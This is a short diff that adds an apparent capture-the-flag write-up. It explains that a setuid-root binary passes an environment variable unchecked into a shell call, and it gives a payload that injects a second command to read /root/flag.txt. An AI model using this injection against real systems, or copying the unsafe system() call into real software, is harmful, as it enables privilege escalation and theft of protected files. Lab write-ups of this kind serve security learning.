@@ -1,0 +1,5 @@
+So basically the program uses SECRET_DIR environment variable and calls:
+system("ls " + SECRET_DIR)
+It can list as root because the file is owned by root and it has setuid bit set.
+To get the flag just do
+SECRET_DIR="/; cat /root/flag.txt" ./bin
